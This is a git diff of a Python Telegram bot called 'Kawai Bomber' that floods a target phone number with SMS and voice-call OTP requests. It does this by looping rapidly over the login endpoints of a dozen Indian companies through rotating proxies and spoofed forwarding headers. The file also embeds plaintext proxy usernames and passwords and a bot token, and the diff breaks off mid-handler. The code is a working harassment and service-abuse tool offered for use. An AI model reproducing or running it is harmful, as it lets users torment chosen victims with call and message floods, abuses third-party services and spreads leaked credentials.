@@ -1,16 +1,30 @@
+#!/usr/bin/env python3
+"""
+KAWAI BOMBER - Advanced SMS/Call Bombing Bot
+Made with ❤️ by @zerocyph
+"""
+
 import asyncio
 import aiohttp
 import json
 import random
 import logging
-from datetime import datetime, timedelta
-from typing import Dict, List, Set, Optional
-from collections import defaultdict
-import os
 import sys
+import os
+from datetime import datetime, timedelta
+from typing import Dict, List, Set, Optional, Tuple
+from collections import defaultdict
+from enum import Enum
 
 # Telegram Bot Imports
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import (
+    Update,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    ReplyKeyboardMarkup,
+    KeyboardButton,
+    ReplyKeyboardRemove
+)
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -21,39 +35,51 @@ from telegram.ext import (
     ConversationHandler
 )
 from telegram.constants import ParseMode
-from telegram.error import InvalidToken, NetworkError
+from telegram.error import TelegramError, NetworkError
 
 # ==================== CONFIGURATION ====================
-# Use environment variable for token, fallback to hardcoded
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAH-rzFBoBCdKMb9A-wv2hx0Hm9RgvGa8m0")
 ADMIN_IDS = {8291098446}  # Your user ID
 APPROVED_USERS = set()
 BANNED_USERS = set()
-USER_DB = {}
+USER_DATABASE = {}
 
 # Conversation states
 PHONE, CONFIRM, BOMB_TYPE = range(3)
 
-# Anime-inspired emojis
+# Anime-inspired emojis and styling
 EMOJIS = {
+    # Basic
     "bomb": "💣", "phone": "📱", "call": "📞", "sms": "💬", "fire": "🔥",
     "rocket": "🚀", "warning": "⚠️", "success": "✅", "error": "❌",
     "clock": "⏰", "stats": "📊", "admin": "👑", "user": "👤", "ban": "🚫",
     "unban": "🔓", "settings": "⚙️", "power": "⚡", "heart": "❤️",
+    
+    # Anime theme
     "star": "⭐", "flower": "🌸", "sparkles": "✨", "zap": "⚡",
     "boom": "💥", "cyclone": "🌀", "dizzy": "💫", "shield": "🛡️",
     "crown": "👑", "tada": "🎉", "confetti": "🎊", "sparkle": "❇️",
     "ring": "💍", "gem": "💎", "trophy": "🏆", "medal": "🏅",
+    
+    # Functional
     "target": "🎯", "speed": "⚡", "bar_chart": "📈", "list": "📋",
     "working": "🟢", "rotation": "🔄", "api": "🔌", "server": "🖥️",
     "cpu": "🧠", "memory": "💾", "disk": "💿", "os": "💻", "python": "🐍",
     "help": "❓", "activity": "📈", "total": "🔢", "sessions": "🔄",
     "proxy": "🛡️", "rank": "🏅", "level": "📊", "premium": "⭐",
-    "permissions": "🔐", "limit": "⏳", "broadcast": "📢", "quick": "⚡"
+    "permissions": "🔐", "limit": "⏳", "broadcast": "📢", "quick": "⚡",
+    "attack": "⚔️", "damage": "💢", "victory": "🏁", "defense": "🛡️",
+    "magic": "🔮", "ninja": "🥷", "samurai": "🗡️", "katana": "⚔️",
+    "cherry": "🌸", "dragon": "🐉", "phoenix": "🔥", "tiger": "🐅",
+    "fox": "🦊", "cat": "🐱", "rabbit": "🐰", "bear": "🐻",
+    "panda": "🐼", "monkey": "🐵", "bird": "🐦", "fish": "🐠",
+    "butterfly": "🦋", "unicorn": "🦄", "rainbow": "🌈", "cloud": "☁️",
+    "moon": "🌙", "sun": "☀️", "star2": "🌟", "comet": "☄️",
+    "galaxy": "🌌", "planet": "🪐", "alien": "👽", "robot": "🤖"
 }
 
 # ASCII Art Banner
-BANNER = r"""
+BANNER = """
 ╔═══╗╔╗    ╔═══╗╔╗ ╔╗╔════╗╔═══╗╔═══╗╔═══╗
 ║╔═╗║║║    ║╔══╝║║ ║║╚══╗═║║╔══╝║╔═╗║║╔══╝
 ║║ ╚╝║║    ║╚══╗║║ ║║  ╔╝╔╝║╚══╗║║ ║║║╚══╗
@@ -62,8 +88,8 @@ BANNER = r"""
 ╚═══╝╚═══╝ ╚═══╝╚═══╝╚════╝╚═══╝╚═══╝╚═══╝
 """
 
-# Proxy List
-PROXY_LIST = [
+# Proxy List (40+ proxies)
+PROXIES = [
     "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
     "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
     "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
@@ -105,19 +131,32 @@ PROXY_LIST = [
     "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
     "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
     "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
-    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6jo",
+    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6jo"
 ]
 
-# API Endpoints (Aggressive version)
-APIS = [
+# API Endpoints (Updated with all your APIs)
+API_ENDPOINTS = [
     # SMS APIs
     {
         "name": "Hungama",
         "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
         "method": "POST",
         "type": "sms",
-        "payload": {"mobileNo": "{phone}", "countryCode": "+91"},
-        "headers": {"Content-Type": "application/json"}
+        "payload": {
+            "mobileNo": "{phone}",
+            "countryCode": "+91",
+            "appCode": "un",
+            "messageId": "1",
+            "subject": "Register",
+            "priority": "1",
+            "device": "web",
+            "variant": "v1",
+            "templateCode": 1
+        },
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json"
+        }
     },
     {
         "name": "Meru Cab",
@@ -125,23 +164,44 @@ APIS = [
         "method": "POST",
         "type": "sms",
         "payload": {"mobile_number": "{phone}"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "okhttp/4.9.0"
+        }
     },
     {
         "name": "Dayco India",
         "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
         "method": "POST",
         "type": "sms",
-        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
+        "payload": {
+            "api": "send_otp",
+            "brand": "dayco",
+            "mob": "{phone}",
+            "resend_otp": "resend_otp"
+        },
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+        }
     },
     {
         "name": "Doubtnut",
         "endpoint": "https://api.doubtnut.com/v4/student/login",
         "method": "POST",
         "type": "sms",
-        "payload": {"phone_number": "{phone}"},
-        "headers": {"Content-Type": "application/json"}
+        "payload": {
+            "app_version": "7.10.51",
+            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
+            "phone_number": "{phone}",
+            "language": "en",
+            "udid": "b751fb63c0ae17ba",
+            "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
+        },
+        "headers": {
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "okhttp/5.0.0-alpha.2"
+        }
     },
     {
         "name": "NoBroker",
@@ -149,32 +209,10 @@ APIS = [
         "method": "POST",
         "type": "sms",
         "payload": {"phone": "{phone}", "countryCode": "IN"},
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
-    },
-    # Call APIs
-    {
-        "name": "Tata Capital",
-        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
-        "method": "POST",
-        "type": "call",
-        "payload": {"phone": "{phone}", "isOtpViaCallAtLogin": "true"},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "1mg Pharmacy",
-        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
-        "method": "POST",
-        "type": "call",
-        "payload": {"number": "{phone}", "otp_on_call": True},
-        "headers": {"Content-Type": "application/json"}
-    },
-    {
-        "name": "Swiggy",
-        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
-        "method": "POST",
-        "type": "call",
-        "payload": {"mobile": "{phone}"},
-        "headers": {"Content-Type": "application/json"}
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+        }
     },
     {
         "name": "Shiprocket",
@@ -182,303 +220,435 @@ APIS = [
         "method": "POST",
         "type": "sms",
         "payload": {"mobileNumber": "{phone}"},
-        "headers": {"Content-Type": "application/json"}
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+        }
+    },
+    {
+        "name": "KPN Fresh",
+        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+        "method": "POST",
+        "type": "sms",
+        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+        }
+    },
+    {
+        "name": "Servetel",
+        "endpoint": "https://api.servetel.in/v1/auth/otp",
+        "method": "POST",
+        "type": "sms",
+        "payload": {"mobile_number": "{phone}"},
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
+        }
+    },
+    
+    # CALL APIs
+    {
+        "name": "Tata Capital",
+        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        "method": "POST",
+        "type": "call",
+        "payload": {
+            "phone": "{phone}",
+            "applSource": "",
+            "isOtpViaCallAtLogin": "true"
+        },
+        "headers": {
+            "Content-Type": "application/json"
+        }
     },
     {
         "name": "Physics Wallah",
         "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
         "method": "POST",
         "type": "call",
-        "payload": {"mobile": "{phone}"},
-        "headers": {"Content-Type": "application/json"}
+        "payload": {
+            "organizationId": "5eb393ee95fab7468a79d189",
+            "mobile": "{phone}"
+        },
+        "headers": {
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "okhttp/3.9.1"
+        }
     },
+    {
+        "name": "1mg Pharmacy",
+        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
+        "method": "POST",
+        "type": "call",
+        "payload": {
+            "number": "{phone}",
+            "is_corporate_user": False,
+            "otp_on_call": True
+        },
+        "headers": {
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "okhttp/3.9.1"
+        }
+    },
+    {
+        "name": "Swiggy",
+        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        "method": "POST",
+        "type": "call",
+        "payload": {"mobile": "{phone}"},
+        "headers": {
+            "content-type": "application/json; charset=utf-8",
+            "user-agent": "Swiggy-Android"
+        }
+    }
 ]
 
 # ==================== GLOBAL VARIABLES ====================
-active_bombs = {}
-user_stats = defaultdict(lambda: {
+active_attacks = {}
+user_statistics = defaultdict(lambda: {
     "sms_count": 0,
     "call_count": 0,
     "total_sessions": 0,
-    "last_active": datetime.now()
+    "last_active": datetime.now(),
+    "total_hits": 0
 })
-bot_stats = {
+bot_statistics = {
     "total_users": 0,
-    "active_bombs": 0,
-    "total_sms": 0,
-    "total_calls": 0,
+    "active_attacks": 0,
+    "total_sms_sent": 0,
+    "total_calls_made": 0,
     "total_sessions": 0,
-    "uptime": datetime.now(),
-    "start_time": datetime.now()
+    "total_hits": 0,
+    "bot_uptime": datetime.now(),
+    "requests_per_minute": 0
 }
 
 # ==================== PROXY MANAGER ====================
-class ProxyManager:
-    def __init__(self, proxies):
-        self.proxies = proxies
-        self.index = 0
+class ProxyRotationManager:
+    def __init__(self, proxy_list):
+        self.proxies = proxy_list
+        self.current_index = 0
+        self.working_proxies = []
         
-    def get_proxy(self):
-        """Get next proxy with authentication"""
+    def get_next_proxy(self):
+        """Get next proxy in rotation"""
         if not self.proxies:
             return None
-            
-        proxy_str = self.proxies[self.index]
-        self.index = (self.index + 1) % len(self.proxies)
         
-        try:
-            # Format: host:port:username:password
-            parts = proxy_str.split(":")
-            if len(parts) == 4:
-                host, port, username, password = parts
-                return f"http://{username}:{password}@{host}:{port}"
-            else:
-                return None
-        except:
-            return None
+        proxy = self.proxies[self.current_index]
+        self.current_index = (self.current_index + 1) % len(self.proxies)
+        return self._format_proxy(proxy)
     
     def get_random_proxy(self):
         """Get random proxy"""
         if not self.proxies:
             return None
-        proxy_str = random.choice(self.proxies)
+        proxy = random.choice(self.proxies)
+        return self._format_proxy(proxy)
+    
+    def _format_proxy(self, proxy_str):
+        """Format proxy string to aiohttp format"""
         try:
-            parts = proxy_str.split(":")
-            if len(parts) == 4:
-                host, port, username, password = parts
-                return f"http://{username}:{password}@{host}:{port}"
+            # Format: host:port:username:password
+            if ":" not in proxy_str:
+                return None
+                
+            host_port, creds = proxy_str.rsplit(":", 1)
+            host, port = host_port.rsplit(":", 1)
+            username, password = creds.split(":", 1)
+            
+            return f"http://{username}:{password}@{host}:{port}"
         except:
-            pass
-        return None
+            return None
+    
+    def get_proxy_count(self):
+        return len(self.proxies)
 
-proxy_manager = ProxyManager(PROXY_LIST)
+proxy_manager = ProxyRotationManager(PROXIES)
 
-# ==================== BOMBING ENGINE ====================
-class BombingEngine:
-    def __init__(self, phone_number, user_id, bomb_type="sms"):
-        self.phone_number = phone_number
+# ==================== ATTACK ENGINE ====================
+class AttackEngine:
+    def __init__(self, target_number, user_id, attack_type="sms"):
+        self.target = target_number
         self.user_id = user_id
-        self.bomb_type = bomb_type
-        self.running = False
+        self.attack_type = attack_type  # "sms", "call", "both"
+        self.is_running = False
         self.start_time = None
-        self.sent_count = 0
+        self.success_count = 0
         self.failed_count = 0
         self.active_apis = []
+        self.proxy_rotation = proxy_manager
+        self.attack_speed = 0.1  # Seconds between attacks
         
-    async def start(self, duration_minutes=60):
-        """Start bombing session"""
-        self.running = True
+    async def launch_attack(self, duration_minutes=60):
+        """Launch attack with time limit"""
+        self.is_running = True
         self.start_time = datetime.now()
         
-        # Filter APIs based on type
-        if self.bomb_type == "sms":
-            self.active_apis = [api for api in APIS if api["type"] == "sms"]
-        elif self.bomb_type == "call":
-            self.active_apis = [api for api in APIS if api["type"] == "call"]
+        # Filter APIs based on attack type
+        if self.attack_type == "sms":
+            self.active_apis = [api for api in API_ENDPOINTS if api["type"] == "sms"]
+        elif self.attack_type == "call":
+            self.active_apis = [api for api in API_ENDPOINTS if api["type"] == "call"]
         else:  # both
-            self.active_apis = APIS
+            self.active_apis = API_ENDPOINTS
         
-        # Calculate end time
+        # Calculate end time (0 = unlimited)
         end_time = None
         if duration_minutes > 0:
             end_time = self.start_time + timedelta(minutes=duration_minutes)
         
-        # Create bombing tasks
-        tasks = []
+        # Create attack tasks for each API
+        attack_tasks = []
         for api in self.active_apis:
-            task = asyncio.create_task(self._attack_loop(api, end_time))
-            tasks.append(task)
+            task = asyncio.create_task(self._execute_api_attack(api, end_time))
+            attack_tasks.append(task)
         
-        # Wait for tasks or timeout
+        # Wait for all tasks or timeout
         try:
-            await asyncio.gather(*tasks)
+            await asyncio.gather(*attack_tasks)
         except asyncio.CancelledError:
             pass
+        finally:
+            self.is_running = False
         
-        self.running = False
-        return self.sent_count
+        return self.success_count
     
-    async def _attack_loop(self, api, end_time):
-        """Continuous attack loop for specific API"""
-        while self.running:
+    async def _execute_api_attack(self, api_config, end_time):
+        """Execute continuous attacks using specific API"""
+        while self.is_running:
             # Check time limit
             if end_time and datetime.now() >= end_time:
                 break
-                
+            
             try:
-                success = await self._send_request(api)
-                if success:
-                    self.sent_count += 1
-                    # Update stats
-                    if api["type"] == "sms":
-                        user_stats[self.user_id]["sms_count"] += 1
-                        bot_stats["total_sms"] += 1
-                    else:
-                        user_stats[self.user_id]["call_count"] += 1
-                        bot_stats["total_calls"] += 1
+                # Send request
+                success = await self._send_attack_request(api_config)
                 
-                # Aggressive delay (very fast)
+                if success:
+                    self.success_count += 1
+                    # Update statistics
+                    if api_config["type"] == "sms":
+                        user_statistics[self.user_id]["sms_count"] += 1
+                        bot_statistics["total_sms_sent"] += 1
+                    else:
+                        user_statistics[self.user_id]["call_count"] += 1
+                        bot_statistics["total_calls_made"] += 1
+                    
+                    user_statistics[self.user_id]["total_hits"] += 1
+                    bot_statistics["total_hits"] += 1
+                
+                # Ultra-fast delay for aggressive bombing
                 await asyncio.sleep(random.uniform(0.05, 0.15))
                 
             except Exception as e:
                 self.failed_count += 1
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.2)
     
-    async def _send_request(self, api):
-        """Send request with proxy rotation"""
+    async def _send_attack_request(self, api_config):
+        """Send HTTP request with proxy rotation"""
         try:
-            proxy = proxy_manager.get_random_proxy()
-            timeout = aiohttp.ClientTimeout(total=2)
+            # Get random proxy
+            proxy_url = proxy_manager.get_random_proxy()
             
-            # Prepare headers
-            headers = api.get("headers", {}).copy()
-            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+            # Prepare timeout
+            timeout = aiohttp.ClientTimeout(total=3)
+            
+            # Prepare headers with randomization
+            headers = api_config.get("headers", {}).copy()
+            
+            # Add random IP addresses
+            random_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
+            headers["X-Forwarded-For"] = random_ip
+            headers["Client-IP"] = random_ip
             
             # Prepare payload
             payload = {}
-            for key, value in api["payload"].items():
+            for key, value in api_config["payload"].items():
                 if isinstance(value, str) and "{phone}" in value:
-                    payload[key] = value.replace("{phone}", self.phone_number)
+                    payload[key] = value.replace("{phone}", self.target)
                 else:
                     payload[key] = value
             
+            # Create connector
             connector = aiohttp.TCPConnector(ssl=False)
+            
             async with aiohttp.ClientSession(
                 connector=connector,
                 timeout=timeout
             ) as session:
                 
-                if api["method"] == "POST":
-                    if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
+                if api_config["method"] == "POST":
+                    content_type = headers.get("Content-Type", "")
+                    
+                    if content_type.startswith("application/x-www-form-urlencoded"):
+                        # Form data
                         data = aiohttp.FormData()
-                        for k, v in payload.items():
-                            data.add_field(k, str(v))
+                        for key, value in payload.items():
+                            data.add_field(key, str(value))
                         
                         async with session.post(
-                            api["endpoint"],
+                            api_config["endpoint"],
                             data=data,
                             headers=headers,
-                            proxy=proxy
+                            proxy=proxy_url
                         ) as response:
                             return response.status in [200, 201, 202]
                     else:
+                        # JSON data
                         async with session.post(
-                            api["endpoint"],
+                            api_config["endpoint"],
                             json=payload,
                             headers=headers,
-                            proxy=proxy
+                            proxy=proxy_url
                         ) as response:
                             return response.status in [200, 201, 202]
                 else:
+                    # GET request
                     async with session.get(
-                        api["endpoint"],
+                        api_config["endpoint"],
                         headers=headers,
-                        proxy=proxy
+                        proxy=proxy_url
                     ) as response:
                         return response.status in [200, 201, 202]
                         
-        except:
+        except Exception as e:
             return False
     
-    def stop(self):
-        """Stop bombing"""
-        self.running = False
+    def stop_attack(self):
+        """Stop the attack"""
+        self.is_running = False
     
-    def get_stats(self):
-        """Get current stats"""
+    def get_attack_stats(self):
+        """Get current attack statistics"""
         if not self.start_time:
-            return {"sent": 0, "failed": 0, "duration": 0}
+            return {
+                "success": 0,
+                "failed": 0,
+                "duration": 0,
+                "speed": 0
+            }
         
         duration = (datetime.now() - self.start_time).total_seconds()
+        if duration > 0:
+            speed = self.success_count / duration
+        else:
+            speed = 0
+        
         return {
-            "sent": self.sent_count,
+            "success": self.success_count,
             "failed": self.failed_count,
+            "total": self.success_count + self.failed_count,
             "duration": duration,
+            "speed": speed,
             "active_apis": len(self.active_apis)
         }
 
-# ==================== TELEGRAM BOT FUNCTIONS ====================
+# ==================== TELEGRAM BOT HANDLERS ====================
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command with anime interface"""
+    """Welcome command with anime-style interface"""
     user_id = update.effective_user.id
     username = update.effective_user.username or update.effective_user.first_name
     
-    # Check if banned
+    # Check if user is banned
     if user_id in BANNED_USERS:
         await update.message.reply_text(
-            f"{EMOJIS['ban']} <b>You are banned from using this bot!</b>",
+            f"{EMOJIS['ban']} <b>ACCESS DENIED!</b>\n\n"
+            f"{EMOJIS['warning']} You have been banned from using this bot.\n"
+            f"{EMOJIS['heart']} Contact admin for appeal.",
             parse_mode=ParseMode.HTML
         )
         return
     
-    # Register user
-    if user_id not in USER_DB:
-        USER_DB[user_id] = {
+    # Register new user
+    if user_id not in USER_DATABASE:
+        USER_DATABASE[user_id] = {
             "username": username,
             "join_date": datetime.now(),
-            "is_premium": user_id in APPROVED_USERS
+            "is_premium": user_id in APPROVED_USERS,
+            "attack_count": 0,
+            "last_seen": datetime.now()
         }
-        bot_stats["total_users"] = len(USER_DB)
+        bot_statistics["total_users"] = len(USER_DATABASE)
     
     # Create welcome message
-    welcome_text = f"""
-{EMOJIS['sparkles']} <b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
-{EMOJIS['crown']} <b>Kawai Bomber v2.0</b> {EMOJIS['crown']}
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+    welcome_message = f"""
+{EMOJIS['sparkles']} <b>｡☆✼★━━━━━━━━━━━━━━━★✼☆｡</b>
+{EMOJIS['crown']} <b>Kawai Bomber v3.0</b> {EMOJIS['crown']}
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['flower']} <b>Welcome, {username}!</b> {EMOJIS['flower']}
+{EMOJIS['flower']} <b>Konichiwa, {username}-san!</b> {EMOJIS['flower']}
 
-{EMOJIS['zap']} <b>Ultra-Fast Bombing Engine</b>
-{EMOJIS['shield']} <b>Proxy Rotation (40+ proxies)</b>
-{EMOJIS['clock']} <b>Smart Time Management</b>
-{EMOJIS['trophy']} <b>Real-time Statistics</b>
+{EMOJIS['dragon']} <b>⚔️ ULTIMATE BOMBING POWER</b>
+{EMOJIS['ninja']} <b>🎯 Precision Targeting System</b>
+{EMOJIS['phoenix']} <b>🔥 Aggressive Attack Engine</b>
+{EMOJIS['fox']} <b>🦊 Smart Proxy Rotation</b>
+{EMOJIS['unicorn']} <b>🌈 Anime-Inspired Interface</b>
 
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 
-{EMOJIS['star']} <b>Available Commands:</b>
-• /bomb - Start bombing session
-• /stop - Stop active bombing
-• /status - View bot statistics
-• /mystats - Your personal stats
-• /help - Show help menu
+{EMOJIS['star']} <b>Quick Commands:</b>
+• /bomb - Launch attack
+• /stop - Stop attack
+• /status - Bot statistics
+• /mystats - Your profile
+• /help - Get help
 
-{EMOJIS['warning']} <b>Important:</b> Use responsibly!
-
-<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
-{EMOJIS['heart']} <i>Made by @zerocyph</i>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+{EMOJIS['heart']} <i>Crafted with love by @zerocyph</i>
 {EMOJIS['power']} <i>Powered by Kawai Technology</i>
+<b>｡☆✼★━━━━━━━━━━━━━━━★✼☆｡</b>
 """
     
-    # Create keyboard
-    keyboard = [
+    # Create interactive keyboard
+    keyboard_buttons = [
         [
-            InlineKeyboardButton(f"{EMOJIS['bomb']} Start Bombing", callback_data="start_bomb"),
-            InlineKeyboardButton(f"{EMOJIS['stats']} Stats", callback_data="show_stats")
+            InlineKeyboardButton(
+                f"{EMOJIS['bomb']} START BOMBING",
+                callback_data="start_bombing"
+            ),
+            InlineKeyboardButton(
+                f"{EMOJIS['stats']} STATS",
+                callback_data="show_stats"
+            )
         ],
         [
-            InlineKeyboardButton(f"{EMOJIS['help']} Help", callback_data="help_menu"),
-            InlineKeyboardButton(f"{EMOJIS['settings']} Settings", callback_data="settings")
+            InlineKeyboardButton(
+                f"{EMOJIS['help']} GUIDE",
+                callback_data="show_help"
+            ),
+            InlineKeyboardButton(
+                f"{EMOJIS['settings']} SETTINGS",
+                callback_data="user_settings"
+            )
         ]
     ]
     
     # Add admin panel for admins
     if user_id in ADMIN_IDS:
-        keyboard.append([
-            InlineKeyboardButton(f"{EMOJIS['admin']} Admin Panel", callback_data="admin_panel")
+        keyboard_buttons.append([
+            InlineKeyboardButton(
+                f"{EMOJIS['admin']} ADMIN PANEL",
+                callback_data="admin_dashboard"
+            )
         ])
     
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    reply_markup = InlineKeyboardMarkup(keyboard_buttons)
     
     await update.message.reply_text(
-        welcome_text,
+        welcome_message,
         parse_mode=ParseMode.HTML,
-        reply_markup=reply_markup
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
     )
 
 async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start bombing conversation"""
     user_id = update.effective_user.id
     
+    # Security checks
     if user_id in BANNED_USERS:
         await update.message.reply_text(
             f"{EMOJIS['ban']} <b>You are banned!</b>",
@@ -486,87 +656,115 @@ async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return ConversationHandler.END
     
-    if user_id in active_bombs:
+    if user_id in active_attacks:
         await update.message.reply_text(
-            f"{EMOJIS['warning']} <b>You already have an active bombing session!</b>\n"
-            f"Use /stop to stop it first.",
+            f"{EMOJIS['warning']} <b>Active attack detected!</b>\n\n"
+            f"You already have a running attack.\n"
+            f"Use /stop to end it first.",
             parse_mode=ParseMode.HTML
         )
         return ConversationHandler.END
     
+    # Ask for phone number
     await update.message.reply_text(
-        f"{EMOJIS['phone']} <b>Enter target phone number (10 digits, without +91):</b>\n\n"
-        f"{EMOJIS['warning']} Example: <code>9876543210</code>",
+        f"{EMOJIS['phone']} <b>ENTER TARGET NUMBER</b>\n\n"
+        f"{EMOJIS['warning']} <i>10 digits only, without +91</i>\n"
+        f"{EMOJIS['example']} Example: <code>9876543210</code>\n\n"
+        f"{EMOJIS['target']} Please enter the number:",
         parse_mode=ParseMode.HTML
     )
     
     return PHONE
 
-async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle phone number input"""
-    phone = update.message.text.strip()
+async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process phone number input"""
+    phone_input = update.message.text.strip()
     
-    # Validate phone
-    if not phone.isdigit() or len(phone) != 10:
+    # Validate phone number
+    if not phone_input.isdigit() or len(phone_input) != 10:
         await update.message.reply_text(
-            f"{EMOJIS['error']} <b>Invalid phone number!</b>\n"
-            f"Please enter 10 digits without +91.\n\n"
+            f"{EMOJIS['error']} <b>INVALID INPUT!</b>\n\n"
+            f"Please enter exactly 10 digits.\n"
+            f"{EMOJIS['example']} Example: <code>9876543210</code>\n\n"
             f"Try again:",
             parse_mode=ParseMode.HTML
         )
         return PHONE
     
-    context.user_data["phone"] = phone
+    # Store phone number
+    context.user_data["target_phone"] = phone_input
     
-    # Ask for confirmation
-    keyboard = [
+    # Request confirmation
+    confirm_keyboard = [
         [
-            InlineKeyboardButton(f"{EMOJIS['success']} Confirm", callback_data="confirm_yes"),
-            InlineKeyboardButton(f"{EMOJIS['error']} Cancel", callback_data="confirm_no")
+            InlineKeyboardButton(
+                f"{EMOJIS['success']} CONFIRM ATTACK",
+                callback_data="confirm_attack"
+            ),
+            InlineKeyboardButton(
+                f"{EMOJIS['error']} CANCEL",
+                callback_data="cancel_attack"
+            )
         ]
     ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    reply_markup = InlineKeyboardMarkup(confirm_keyboard)
     
     await update.message.reply_text(
-        f"{EMOJIS['warning']} <b>Confirm Target:</b>\n"
-        f"<code>{phone}</code>\n\n"
-        f"{EMOJIS['fire']} <b>Proceed with bombing?</b>",
+        f"{EMOJIS['warning']} <b>ATTACK CONFIRMATION</b>\n\n"
+        f"{EMOJIS['target']} <b>Target:</b> <code>{phone_input}</code>\n"
+        f"{EMOJIS['dragon']} <b>Type:</b> SMS + Call Bombing\n\n"
+        f"{EMOJIS['fire']} <b>Proceed with attack?</b>",
         parse_mode=ParseMode.HTML,
         reply_markup=reply_markup
     )
     
     return CONFIRM
 
-async def handle_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle confirmation"""
+async def handle_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle attack confirmation"""
     query = update.callback_query
     await query.answer()
     
-    if query.data == "confirm_no":
+    if query.data == "cancel_attack":
         await query.edit_message_text(
-            f"{EMOJIS['success']} <b>Bombing cancelled!</b>",
+            f"{EMOJIS['success']} <b>ATTACK CANCELLED</b>\n\n"
+            f"{EMOJIS['shield']} No attack was launched.",
             parse_mode=ParseMode.HTML
         )
         return ConversationHandler.END
     
-    # Show bombing type selection
-    keyboard = [
+    # Show attack type selection
+    attack_types_keyboard = [
         [
-            InlineKeyboardButton(f"{EMOJIS['sms']} SMS Only", callback_data="type_sms"),
-            InlineKeyboardButton(f"{EMOJIS['call']} Call Only", callback_data="type_call")
+            InlineKeyboardButton(
+                f"{EMOJIS['sms']} SMS ONLY",
+                callback_data="attack_sms"
+            ),
+            InlineKeyboardButton(
+                f"{EMOJIS['call']} CALL ONLY",
+                callback_data="attack_call"
+            )
         ],
         [
